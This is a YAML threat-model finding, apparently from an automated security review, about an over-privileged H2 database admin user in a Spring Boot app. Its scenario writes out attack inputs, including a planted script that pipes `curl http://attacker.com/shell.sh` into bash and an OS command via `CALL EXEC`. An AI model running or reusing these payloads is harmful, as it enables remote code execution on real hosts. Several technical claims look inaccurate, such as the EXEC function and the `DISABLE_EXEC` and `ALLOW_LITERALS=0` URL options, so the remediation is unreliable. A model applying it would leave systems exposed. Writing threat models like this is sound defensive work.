- local_id: h2-database-006
  threat_category_id: TH-06
  additional_categories: []
  stride: Elevation of Privilege
  cwe: CWE-250
  title: H2 Admin User Enables OS-Level File Write — application-unsafe.properties:1
  affected_parameter: null
  scenario: 'An attacker who authenticates to the H2 console as `admin/hacker` (or connects without authentication via the
    open console) invokes H2''s built-in file-writing functions: `CALL CSVWRITE(''/opt/app/scripts/exploit.sh'', ''SELECT
    ''''#!/bin/bash\ncurl http://attacker.com/shell.sh | bash'''' FROM DUAL'')` or `SCRIPT TO ''/opt/app/webapps/VulnerableApp/exploit.jsp''`.
    Because H2''s admin user runs within the JVM process, file writes occur as the OS user that started Spring Boot (typically
    `root` in a development Docker container). Alternatively, the attacker executes `CALL EXEC(''id > /tmp/pwned'')` using
    H2''s EXEC scalar function, achieving OS command execution. This escalates database-tier access to host-level code execution.'
  evidence_summary: application-unsafe.properties:1 grants the `admin` user full H2 privileges; H2's SCRIPT TO and EXEC functions
    are available to the admin user by default and no FILE_WRITE or EXEC restrictions appear in the JDBC URL or properties
    files.
  impact_description: An attacker escalates from unauthenticated HTTP access to arbitrary OS command execution on the container
    host, enabling container escape or lateral movement.
  likelihood: Medium
  impact: Critical
  risk: High
  controls_in_place: None — admin credentials are in plaintext; H2 system functions are unrestricted.
  mitigation_title: Restrict H2 EXEC and file-write functions by disabling them in the JDBC URL and run the JVM as a non-root
    OS user
  remediation:
    effort: Medium
    steps:
    - 'Append `ALLOW_LITERALS=0` and `DISABLE_EXEC=true` to the JDBC URL (note: H2 2.x restricts EXEC by default in many modes;
      verify the version in pom.xml and apply the appropriate URL option).'
    - Run the Spring Boot JVM as a non-root OS user in Docker (add `USER appuser` in the Dockerfile after creating the user)
      so file writes land in a restricted directory even if H2 functions execute.
    - Add SecurityManager or Java 17+ module restrictions to deny `java.io.FilePermission` write access from within the H2
      engine class path.
    - Secure the H2 console with authentication (see h2-database-002) so that this function is unreachable without explicit
      login.
    code_example: null
    reference: CWE-250
